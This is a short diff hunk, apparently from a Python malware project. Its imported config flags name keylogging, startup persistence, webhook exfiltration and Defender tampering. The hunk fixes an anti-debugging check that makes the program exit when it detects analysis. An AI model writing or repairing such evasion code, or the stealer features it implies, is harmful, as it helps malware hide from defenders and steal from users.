@@ -21,7 +21,7 @@ from config import DEFENDER, ERROR, KEYLOGGER, STARTUP, WEBHOOK, ANTIDEBUG, MOVE
 
 if ANTIDEBUG:
     try:
-        if Antidebug.main():
+        if Antidebug().main():
             sys.exit(1)
     except: pass
 
